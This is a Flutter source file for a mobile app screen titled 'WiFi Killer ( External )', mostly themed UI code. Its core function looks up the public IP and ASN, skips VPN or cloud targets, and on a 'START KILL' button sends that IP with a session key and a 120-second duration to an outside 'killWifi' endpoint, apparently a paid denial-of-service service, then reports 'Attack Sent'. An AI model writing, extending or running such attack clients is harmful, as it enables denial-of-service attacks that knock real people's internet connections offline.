// lib/wifi_external.dart — Full 3 Style Support (FIXED)
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'app_theme.dart';

// ═══════════════════════════════════════════════════════════
// HUD CORNER PAINTER
// ═══════════════════════════════════════════════════════════
class _HudCornerPainter extends CustomPainter {
  final Color color;
  const _HudCornerPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = 1.4
      ..style = PaintingStyle.stroke;
    final l = size.width * 0.5;
    canvas.drawLine(Offset.zero, Offset(l, 0), p);
    canvas.drawLine(Offset.zero, Offset(0, l), p);
    canvas.drawLine(
        Offset(size.width, size.height), Offset(size.width - l, size.height), p);
    canvas.drawLine(
        Offset(size.width, size.height), Offset(size.width, size.height - l), p);
  }

  @override
  bool shouldRepaint(_HudCornerPainter old) => old.color != color;
}

class _HudGridPainter extends CustomPainter {
  final Color color;
  const _HudGridPainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    final p = Paint()
      ..color = color
      ..strokeWidth = 0.6;
    const step = 28.0;
    for (double x = 0; x < size.width; x += step) {
      canvas.drawLine(Offset(x, 0), Offset(x, size.height), p);
    }
    for (double y = 0; y < size.height; y += step) {
      canvas.drawLine(Offset(0, y), Offset(size.width, y), p);
    }
  }

  @override
  bool shouldRepaint(_HudGridPainter old) => old.color != color;
}

// ═══════════════════════════════════════════════════════════
// METAL PLATE
// ═══════════════════════════════════════════════════════════
class _MetalPlate extends StatelessWidget {
  final AppPalette C;
  final Widget child;
  final EdgeInsets padding;
  final bool brass;
  final double radius;
  const _MetalPlate({
    required this.C,
    required this.child,
    this.padding = const EdgeInsets.all(16),
    this.brass = false,
    this.radius = 16,
  });

  @override
  Widget build(BuildContext context) {
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    if (isComic) {
      return Container(
        padding: padding,
        decoration: BoxDecoration(
          color: brass ? C.primaryHi : C.bgDark,
          borderRadius: BorderRadius.circular(radius + 4),
          border: Border.all(color: Colors.black, width: 4),
          boxShadow: const [
            BoxShadow(
                color: Colors.black, offset: Offset(6, 6), blurRadius: 0),
          ],
        ),
        child: child,
      );
    }

    if (isHud) {
      return Container(
        decoration: BoxDecoration(
          color: C.hudPanel(),
          border: Border.all(color: C.hudBorder(), width: 1.2),
          boxShadow: [
            BoxShadow(color: C.accent.withOpacity(0.15), blurRadius: 12),
          ],
        ),
        child: Stack(
          children: [
            Padding(padding: padding, child: child),
            Positioned(top: 0, left: 0, child: _corner(C)),
            Positioned(top: 0, right: 0, child: _corner(C)),
            Positioned(bottom: 0, left: 0, child: _corner(C)),
            Positioned(bottom: 0, right: 0, child: _corner(C)),
          ],
        ),
      );
    }

    return Container(
      decoration: BoxDecoration(
        borderRadius: BorderRadius.circular(radius),
        gradient: LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: brass
              ? [C.accentHi, C.accent, C.primary, C.primaryLo]
              : [C.text, C.bg, C.bgDark, C.bgDeep],
          stops: const [0.0, 0.4, 0.7, 1.0],
        ),
        boxShadow: [
          BoxShadow(
              color: Colors.black.withOpacity(0.75),
              offset: const Offset(0, 6),
              blurRadius: 12),
        ],
      ),
      padding: const EdgeInsets.all(3),
      child: Container(
        padding: padding,
        decoration: BoxDecoration(
          borderRadius: BorderRadius.circular(radius - 3),
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [C.bg, C.bgDark, C.bgDeep],
          ),
          border: Border.all(color: Colors.black.withOpacity(0.5)),
        ),
        child: child,
      ),
    );
  }

  Widget _corner(AppPalette C) => SizedBox(
        width: 12,
        height: 12,
        child: CustomPaint(
          painter: _HudCornerPainter(color: C.accent.withOpacity(0.8)),
        ),
      );
}

// ═══════════════════════════════════════════════════════════
// WIFI INTERNAL PAGE (External WiFi Killer)
// ═══════════════════════════════════════════════════════════
class WifiInternalPage extends StatefulWidget {
  final String sessionKey;
  const WifiInternalPage({super.key, required this.sessionKey});

  @override
  State<WifiInternalPage> createState() => _WifiInternalPageState();
}

class _WifiInternalPageState extends State<WifiInternalPage> {
  String publicIp = "-";
  String region = "-";
  String asn = "-";
  bool isVpn = false;
  bool isLoading = true;
  bool isAttacking = false;

  @override
  void initState() {
    super.initState();
    _loadPublicInfo();
  }

  Future<void> _loadPublicInfo() async {
    setState(() => isLoading = true);

    try {
      final ipRes = await http
          .get(Uri.parse("https://api.ipify.org?format=json"));
      final ipJson = jsonDecode(ipRes.body);
      final ip = ipJson['ip'];

      final infoRes = await http.get(Uri.parse(
          "http://ip-api.com/json/$ip?fields=as,regionName,status,query"));
      final info = jsonDecode(infoRes.body);

      final asnRaw = (info['as'] as String).toLowerCase();
      final isBlockedAsn = asnRaw.contains("vpn") ||
          asnRaw.contains("cloud") ||
          asnRaw.contains("digitalocean") ||
          asnRaw.contains("aws") ||
          asnRaw.contains("google");

      setState(() {
        publicIp = ip;
        region = info['regionName'] ?? "-";
        asn = info['as'] ?? "-";
        isVpn = isBlockedAsn;
        isLoading = false;
      });
    } catch (e) {
      setState(() {
        publicIp = region = asn = "Error";
        isLoading = false;
      });
    }
  }

  Future<void> _attackTarget() async {
    setState(() => isAttacking = true);
    final url = Uri.parse(
        "https://evo.nullxteam.fun/killWifi?key=${widget.sessionKey}&target=$publicIp&duration=120");
    try {
      final res = await http.get(url);
      if (res.statusCode == 200) {
        _showAlert("✅ Attack Sent", "WiFi attack sent to $publicIp");
      } else {
        _showAlert("❌ Failed", "Server rejected request.");
      }
    } catch (e) {
      _showAlert("Error", "Network error: $e");
    } finally {
      setState(() => isAttacking = false);
    }
  }

  void _showAlert(String title, String message) {
    final C = AppTheme.current.value;
    final style = AppTheme.currentStyle.value;
    final isComic = style == ThemeStyle.comic3d;
    final isHud = style == ThemeStyle.hudTactical;

    showDialog(
      context: context,
      builder: (_) => Dialog(
        backgroundColor: Colors.transparent,
        child: _MetalPlate(
          C: C,
          padding: const EdgeInsets.all(20),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Row(
                children: [
                  Icon(Icons.info_outline_rounded,
                      color: isComic
                          ? C.comicText
                          : (isHud ? C.hudNeon() : C.accent)),
                  const SizedBox(width: 10),
                  Expanded(
                    child: Text(
                      title,
                      style: TextStyle(
                        color: isComic
                            ? C.comicText
                            : (isHud ? C.hudNeon() : C.accent),
                        fontFamily:
                            isComic ? 'Bangers' : 'Orbitron',
                        fontWeight: FontWeight.w900,
                        fontSize: isComic ? 18 : 13,
                        letterSpacing: isComic ? 2 : 2.5,
                        shadows: isHud
                            ? [
                                Shadow(
                                    color: C.accent.withOpacity(0.5),
                                    blurRadius: 8),
                              ]
                            : null,
                      ),
                    ),
                  ),
                ],
              ),
              const SizedBox(height: 16),
              Text(
                message,
                textAlign: TextAlign.center,
                style: TextStyle(
                  color: isComic
                      ? C.comicText
                      : (isHud ? C.hudText() : C.text.withOpacity(0.85)),
                  fontSize: 12,
                  fontFamily:
                      isComic ? 'ComicNeue' : 'ShareTechMono',
                  height: 1.5,
                ),
              ),
              const SizedBox(height: 20),
              GestureDetector(
                onTap: () => Navigator.pop(context),
                child: Container(
                  height: 46,
                  padding:
                      const EdgeInsets.symmetric(horizontal: 30),
                  decoration: isHud
                      ? BoxDecoration(
                          color: C.accent.withOpacity(0.15),
                          border: Border.all(
                              color: C.accent, width: 1.4),
                          boxShadow: [
                            BoxShadow(
                                color: C.accent.withOpacity(0.5),
                                blurRadius: 12),
                          ],
                        )
                      : BoxDecoration(
                          color: isComic ? C.primaryHi : C.accent,
                          borderRadius: BorderRadius.circular(
                              isComic ? 14 : 12),
                          border: Border.all(
                              color: isComic
                                  ? Colors.black
                                  : C.accent,
                              width: isComic ? 4 : 1.5),
                          boxShadow: isComic
                              ? const [
                                  BoxShadow(
                                      color: Colors.black,
                                      offset: Offset(4, 4),
                                      blurRadius: 0),
                                ]
                              : null,
                        ),
                  child: Center(
                    child: Text(
                      'OK',
                      style: TextStyle(
                        color: isComic
                            ? C.contrastTextOn(C.primaryHi)
                            : (isHud ? C.hudNeon() : Colors.white),
                        fontWeight: FontWeight.bold,
                        fontFamily:
                            isComic ? 'Bangers' : 'Orbitron',
                        letterSpacing: 2,
                        fontSize: isComic ? 15 : 12,
                      ),
                    ),
                  ),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Widget _infoCard(AppPalette C, bool isComic, bool isHud,
      String title, String value, IconData icon) {
    return Padding(
      padding: const EdgeInsets.only(bottom: 10),
      child: _MetalPlate(
        C: C,
        padding: const EdgeInsets.all(14),
        child: Row(
          children: [
            Container(
              padding: const EdgeInsets.all(10),
              decoration: isHud
                  ? BoxDecoration(
                      color: C.accent.withOpacity(0.15),
                      border:
                          Border.all(color: C.accent, width: 1.2),
                      boxShadow: [
                        BoxShadow(
                            color: C.accent.withOpacity(0.5),
                            blurRadius: 8),
                      ],
                    )
                  : BoxDecoration(
                      shape: BoxShape.circle,
                      color: isComic
                          ? C.primaryHi
                          : C.primaryHi.withOpacity(0.2),
                      border: Border.all(
                          color: isComic
                              ? Colors.black
                              : C.primaryHi.withOpacity(0.6),
                          width: isComic ? 3 : 1),
                    ),
              child: Icon(icon,
                  color: isComic
                      ? C.contrastTextOn(C.primaryHi)
                      : (isHud ? C.hudNeon() : C.primaryHi),
                  size: 20),
            ),
            const SizedBox(width: 14),
            Expanded(
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  Text(title,
                      style: TextStyle(
                        color: isComic
                            ? C.comicText
                            : (isHud ? C.hudNeon() : C.accent),
                        fontWeight: FontWeight.bold,
                        fontFamily:
                            isComic ? 'Bangers' : 'Orbitron',
                        fontSize: isComic ? 13 : 10,
                        letterSpacing: isComic ? 1 : 2,
                      )),
                  const SizedBox(height: 4),
                  Text(value,
                      style: TextStyle(
                        color: isComic
                            ? Colors.black
                            : (isHud ? C.hudText() : C.text),
                        fontSize: isComic ? 15 : 14,
                        fontFamily:
                            isComic ? 'ComicNeue' : 'ShareTechMono',
                        fontWeight: FontWeight.w700,
                      ),
                      maxLines: 1,
                      overflow: TextOverflow.ellipsis),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    return ValueListenableBuilder<AppPalette>(
      valueListenable: AppTheme.current,
      builder: (context, C, _) {
        return ValueListenableBuilder<ThemeStyle>(
          valueListenable: AppTheme.currentStyle,
          builder: (context, style, __) {
            final isComic = style == ThemeStyle.comic3d;
            final isHud = style == ThemeStyle.hudTactical;

            return Scaffold(
              backgroundColor:
                  isComic ? C.bg : (isHud ? C.hudBg() : C.bgDeep),
              appBar: AppBar(
                title: Text(
                  "📡 WiFi Killer ( External )",
                  style: TextStyle(
                    fontFamily: isComic ? 'Bangers' : 'Orbitron',
                    fontWeight: FontWeight.w900,
                    color: isComic
                        ? C.comicText
                        : (isHud ? C.hudNeon() : C.text),
                    fontSize: isComic ? 20 : 14,
                    letterSpacing: isComic ? 1.5 : 2,
                    shadows: isHud
                        ? [
                            Shadow(
                                color: C.accent.withOpacity(0.5),
                                blurRadius: 8),
                          ]
                        : null,
                  ),
                ),
                backgroundColor: isComic
                    ? C.bgDark
                    : (isHud ? C.hudPanel() : C.bgDark),
                elevation: 0,
                iconTheme: IconThemeData(
                    color: isComic
                        ? C.comicText
                        : (isHud ? C.hudNeon() : C.text)),
                bottom: PreferredSize(
                  preferredSize: Size.fromHeight(isComic ? 4 : 1.2),
                  child: Container(
                      height: isComic ? 4 : 1.2,
                      color: isComic
                          ? Colors.black
                          : (isHud ? C.hudBorder() : C.accent)),
                ),
              ),
              body: Container(
                decoration: isComic
                    ? BoxDecoration(color: C.bg)
                    : (isHud
                        ? BoxDecoration(color: C.hudBg())
                        : BoxDecoration(
                            gradient: LinearGradient(
                              colors: [C.bgDeep, C.bgDark],
                              begin: Alignment.topCenter,
                              end: Alignment.bottomCenter,
                            ),
                          )),
                child: Stack(
                  children: [
                    if (isComic)
                      Positioned.fill(
                        child: CustomPaint(
                          painter: _ComicHalftonePainter(
                              color: C.primaryLo.withOpacity(0.12)),
                        ),
                      ),
                    if (isHud)
                      Positioned.fill(
                        child: CustomPaint(
                          painter:
                              _HudGridPainter(color: C.hudGridLine()),
                        ),
                      ),
                    SafeArea(
                      child: Padding(
                        padding: const EdgeInsets.all(16),
                        child: isLoading
                            ? Center(
                                child: CircularProgressIndicator(
                                    color: isComic
                                        ? Colors.black
                                        : (isHud
                                            ? C.hudNeon()
                                            : C.accent)))
                            : Column(
                                crossAxisAlignment:
                                    CrossAxisAlignment.stretch,
                                children: [
                                  Row(
                                    children: [
                                      Icon(Icons.gps_fixed_rounded,
                                          color: isComic
                                              ? C.comicText
                                              : (isHud
                                                  ? C.hudNeon()
                                                  : C.accent),
                                          size: isComic ? 24 : 20),
                                      const SizedBox(width: 10),
                                      Text(
                                        "🎯 System Information",
                                        style: TextStyle(
                                          fontSize: isComic ? 20 : 14,
                                          color: isComic
                                              ? C.comicText
                                              : (isHud
                                                  ? C.hudNeon()
                                                  : C.text),
                                          fontWeight: FontWeight.bold,
                                          fontFamily: isComic
                                              ? 'Bangers'
                                              : 'Orbitron',
                                          letterSpacing:
                                              isComic ? 1.5 : 2,
                                          shadows: isHud
                                              ? [
                                                  Shadow(
                                                      color: C.accent
                                                          .withOpacity(
                                                              0.5),
                                                      blurRadius: 8),
                                                ]
                                              : null,
                                        ),
                                      ),
                                    ],
                                  ),
                                  const SizedBox(height: 14),
                                  _infoCard(C, isComic, isHud,
                                      "IP Address", publicIp,
                                      Icons.language),
                                  _infoCard(C, isComic, isHud,
                                      "Region", region, Icons.map),
                                  _infoCard(C, isComic, isHud,
                                      "ASN", asn, Icons.storage),
                                  const SizedBox(height: 16),
                                  if (isVpn)
                                    Container(
                                      padding: const EdgeInsets.all(16),
                                      decoration: isHud
                                          ? BoxDecoration(
                                              color: C.primaryHi
                                                  .withOpacity(0.15),
                                              border: Border.all(
                                                  color: C.primaryHi,
                                                  width: 1.4),
                                              boxShadow: [
                                                BoxShadow(
                                                    color: C.primaryHi
                                                        .withOpacity(
                                                            0.5),
                                                    blurRadius: 12),
                                              ],
                                            )
                                          : BoxDecoration(
                                              color: isComic
                                                  ? C.primaryHi
                                                  : C.bgDark,
                                              borderRadius:
                                                  BorderRadius.circular(
                                                      isComic ? 14 : 12),
                                              border: Border.all(
                                                  color: isComic
                                                      ? Colors.black
                                                      : C.primaryHi,
                                                  width:
                                                      isComic ? 3 : 1.5),
                                              boxShadow: isComic
                                                  ? const [
                                                      BoxShadow(
                                                          color: Colors
                                                              .black,
                                                          offset: Offset(
                                                              4, 4),
                                                          blurRadius: 0),
                                                    ]
                                                  : null,
                                            ),
                                      child: Text(
                                        "⚠️ Target berasal dari VPN/Hosting.\nSerangan dibatalkan.",
                                        textAlign: TextAlign.center,
                                        style: TextStyle(
                                          color: isComic
                                              ? Colors.white
                                              : (isHud
                                                  ? C.hudNeon()
                                                  : Colors.white),
                                          fontFamily: isComic
                                              ? 'Bangers'
                                              : 'ShareTechMono',
                                          fontSize: isComic ? 14 : 11,
                                          fontWeight: FontWeight.w900,
                                          letterSpacing: isHud ? 1 : 0,
                                        ),
                                      ),
                                    ),
                                  if (!isVpn)
                                    Center(
                                      child: GestureDetector(
                                        onTap: isAttacking
                                            ? null
                                            : _attackTarget,
                                        child: Container(
                                          height: 56,
                                          padding: const EdgeInsets
                                              .symmetric(
                                              horizontal: 40),
                                          decoration: isHud
                                              ? BoxDecoration(
                                                  color: C.accent
                                                      .withOpacity(0.15),
                                                  border: Border.all(
                                                      color: C.accent,
                                                      width: 1.4),
                                                  boxShadow: [
                                                    BoxShadow(
                                                        color: C.accent
                                                            .withOpacity(
                                                                0.5),
                                                        blurRadius: 12),
                                                  ],
                                                )
                                              : BoxDecoration(
                                                  color: isComic
                                                      ? C.primaryHi
                                                      : null,
                                                  gradient: !isComic
                                                      ? LinearGradient(
                                                          colors: [
                                                            C.primaryHi,
                                                            C.primary,
                                                          ])
                                                      : null,
                                                  borderRadius:
                                                      BorderRadius
                                                          .circular(
                                                              isComic
                                                                  ? 14
                                                                  : 30),
                                                  border: Border.all(
                                                      color: isComic
                                                          ? Colors
                                                              .black
                                                          : C.primaryHi,
                                                      width: isComic
                                                          ? 4
                                                          : 1.5),
                                                  boxShadow: isComic
                                                      ? const [
                                                          BoxShadow(
                                                              color: Colors
                                                                  .black,
                                                              offset:
                                                                  Offset(
                                                                      4,
                                                                      4),
                                                              blurRadius:
                                                                  0),
                                                        ]
                                                      : null,
                                                ),
                                          child: Row(
                                            mainAxisAlignment:
                                                MainAxisAlignment
                                                    .center,
                                            children: [
                                              if (isAttacking)
                                                SizedBox(
                                                  width: 18,
                                                  height: 18,
                                                  child:
                                                      CircularProgressIndicator(
                                                    strokeWidth: 2,
                                                    color: isComic
                                                        ? C.contrastTextOn(
                                                            C.primaryHi)
                                                        : (isHud
                                                            ? C.hudNeon()
                                                            : Colors
                                                                .white),
                                                  ),
                                                )
                                              else
                                                Icon(Icons.wifi_off,
                                                    color: isComic
                                                        ? C.contrastTextOn(
                                                            C.primaryHi)
                                                        : (isHud
                                                            ? C.hudNeon()
                                                            : Colors
                                                                .white),
                                                    size: 22),
                                              const SizedBox(width: 12),
                                              Text(
                                                isAttacking
                                                    ? "ATTACKING..."
                                                    : "START KILL",
                                                style: TextStyle(
                                                  color: isComic
                                                      ? C.contrastTextOn(
                                                          C.primaryHi)
                                                      : (isHud
                                                          ? C.hudNeon()
                                                          : Colors
                                                              .white),
                                                  fontFamily: isComic
                                                      ? 'Bangers'
                                                      : 'Orbitron',
                                                  fontWeight:
                                                      FontWeight.bold,
                                                  fontSize:
                                                      isComic ? 18 : 14,
                                                  letterSpacing: isComic
                                                      ? 1.5
                                                      : 2,
                                                ),
                                              ),
                                            ],
                                          ),
                                        ),
                                      ),
                                    ),
                                ],
                              ),
                      ),
                    ),
                  ],
                ),
              ),
            );
          },
        );
      },
    );
  }
}

// ═══════════════════════════════════════════════════════════
// COMIC HALFTONE PAINTER
// ═══════════════════════════════════════════════════════════
class _ComicHalftonePainter extends CustomPainter {
  final Color color;
  const _ComicHalftonePainter({required this.color});

  @override
  void paint(Canvas canvas, Size size) {
    const spacing = 22.0;
    final paint = Paint()..color = color;
    for (double x = 0; x < size.width + spacing; x += spacing) {
      for (double y = 0; y < size.height + spacing; y += spacing) {
        canvas.drawCircle(Offset(x, y), 2.5, paint);
      }
    }
  }

  @override
  bool shouldRepaint(_ComicHalftonePainter old) => old.color != color;
}